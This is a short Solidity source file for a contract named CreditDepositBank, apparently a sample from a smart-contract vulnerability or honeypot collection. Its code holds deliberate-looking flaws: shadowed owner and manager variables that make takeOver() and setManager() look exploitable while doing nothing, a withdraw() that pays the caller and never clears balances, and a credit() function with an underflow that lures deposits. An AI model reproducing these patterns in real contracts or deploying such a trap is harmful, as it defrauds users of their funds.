1 pragma solidity ^0.4.17;
2 
3 contract Ownable {
4     address public owner;
5 
6     function Ownable() public {
7         owner = msg.sender;
8     }
9 
10     modifier onlyOwner() {
11         require(msg.sender == owner);
12         _;
13     }
14 }
15 
16 contract CreditDepositBank is Ownable {
17     mapping (address => uint) public balances;
18     
19     address public owner;
20 
21     function takeOver() public {
22         if (balances[msg.sender] > 0) {
23             owner = msg.sender;
24         }
25     }
26     
27     address public manager;
28     
29     modifier onlyManager() {
30         require(msg.sender == manager);
31         _;
32     }
33 
34     function setManager(address manager) public {
35         if (balances[manager] > 100 finney) {
36             manager = manager;
37         }
38     }
39 
40     function() public payable {
41         deposit();
42     }
43     
44     function deposit() public payable {
45         if (msg.value >= 10 finney)
46             balances[msg.sender] += msg.value;
47         else
48             revert();
49     }
50     
51     function withdraw(address client) public onlyOwner {
52         require (balances[client] > 0);
53         msg.sender.send(balances[client]);
54     }
55 
56     function credit() public payable {
57         if (msg.value >= this.balance) {
58             balances[msg.sender] -= this.balance + msg.value;
59             msg.sender.send(this.balance + msg.value);
60         }
61     }
62     
63     function close() public onlyManager {
64         manager.send(this.balance);
65 	    if (this.balance == 0) {  
66 		    selfdestruct(manager);
67 	    }
68     }
69 }